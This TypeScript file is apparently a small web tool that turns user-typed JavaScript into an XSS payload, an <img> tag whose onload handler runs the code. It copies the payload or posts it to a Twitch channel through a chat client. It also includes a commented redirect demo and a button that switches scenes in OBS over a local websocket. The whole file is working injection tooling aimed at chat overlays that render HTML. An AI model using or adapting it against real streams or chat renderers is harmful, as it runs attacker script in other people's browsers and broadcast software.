import './style.css';
import { client } from './tmi';

const makeTinyFunctionString = (fnStr: string) => fnStr.replace(/\s/g, '').replace('()=>', '').replaceAll('"', "'");
const copyButton = document.querySelector<HTMLButtonElement>('#app #copy')!;
const sendButton = document.querySelector<HTMLButtonElement>('#app #send')!;
const sendOBSbutton = document.querySelector<HTMLButtonElement>('#app #sendobs')!;
const textArea = document.querySelector<HTMLTextAreaElement>('#app #text')!;
const createPayloadString = (tinyFunction: string) =>
  `<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="${tinyFunction}">`;

// const functionToStringContent = (fn: () => void) => fn.toString()
// const demoPayload = buildPayload(() => document.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ');
const ws = new WebSocket('ws://localhost:4455');

copyButton.addEventListener('click', () => {
  const payload = createPayloadString(makeTinyFunctionString(textArea.value));
  navigator.clipboard.writeText(payload);
});

sendButton.addEventListener('click', () => {
  const payload = createPayloadString(makeTinyFunctionString(textArea.value));
  client.say('neolectron', payload);
});

sendOBSbutton.addEventListener('click', () => {
  const obsDemoPayload = {
    op: 6,
    d: { requestType: 'SetCurrentProgramScene', requestData: { sceneName: '#-----------------' } },
  };
  ws.send(JSON.stringify(obsDemoPayload));
});

ws.addEventListener('open', () => {
  console.log('connected to obs websocket');
});

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log('<', data);
};
